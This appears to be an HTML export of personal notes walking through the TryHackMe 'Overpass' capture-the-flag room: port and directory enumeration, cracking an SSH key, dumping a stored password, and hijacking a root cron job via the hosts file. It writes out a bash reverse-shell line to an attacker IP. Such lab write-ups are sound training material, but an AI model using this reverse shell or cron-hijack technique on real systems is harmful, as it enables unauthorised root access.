<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>overpass</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>overpass</h1><br/><strong><h1>THM Overpass</h1></strong><br /><br /><strong><h2>Enumeration</h2></strong><br /><br /><br /><strong>Rustscan</strong><br /><img src="images/25-1.png" alt="images/25-1.png" /><br /><br /><strong>Nmap</strong><br /><img src="images/25-2.png" alt="images/25-2.png" /><br /><br /><br /><strong>Directory Enumeration</strong><br /><br /><img src="images/25-3.png" alt="images/25-3.png" /><br /><br /><img src="images/25-4.png" alt="images/25-4.png" /><br /><br /><br /><strong><h2>Foothold</h2></strong><br /><br /><img src="images/25-5.png" alt="images/25-5.png" />\<br /><br /><img src="images/25-6.png" alt="images/25-6.png" /><br /><br /><img src="images/25-7.png" alt="images/25-7.png" /><br /><br /><br /><img src="images/25-8.png" alt="images/25-8.png" /><br /><br /><br />We copy the ssh private id into the <strong>ssh_hash</strong> file. Then convert it to john format as folllows and then crack it.<br /><br /><img src="images/25-9.png" alt="images/25-9.png" /><br /><br /><strong>We use the found password to login into ssh using the id_key and password found</strong><br /><br /><img src="images/25-10.png" alt="images/25-10.png" /><br /><br />We get 2 documents in the user directory as follows.<br /><img src="images/25-11.png" alt="images/25-11.png" /><br /><br /><br />As system password is stored in overpass. We find it and run it as follows<br />Choose Option 4 to dump the passwords. We get <strong>james</strong> password<br /><img src="images/25-12.png" alt="images/25-12.png" /><br /><br /><br /><strong><h2>Privilege Escalation</h2></strong><br /><br />We checked sudo, <strong>james</strong> had no sudo access.<br />Next we focus on <strong>crontabs</strong><br /><br /><img src="images/25-13.png" alt="images/25-13.png" /><br /><br />Every minute root visits the webiste overpass.thm<br />We edit the hosts files for overpass.thm to point our local websever.<br /><br /><br /><img src="images/25-14.png" alt="images/25-14.png" /><br /><br /><strong>In Kali Machine</strong><br />We create a revershell and host it as following.<br /><br /><img src="images/25-15.png" alt="images/25-15.png" /><br /><br />Contents in <strong>buildscript.sh</strong><br /><strong>bash -i &gt;&amp; /dev/tcp/10.11.72.31/8888 0&gt;&amp;1</strong><br /><br /><br /><img src="images/25-16.png" alt="images/25-16.png" /><br /><br /><br />Within a minute, the crotab will be called and we will get a root shell.<br /><br /><img src="images/25-17.png" alt="images/25-17.png" /><br /><br />Thanks!!</div>
</body>
</html>
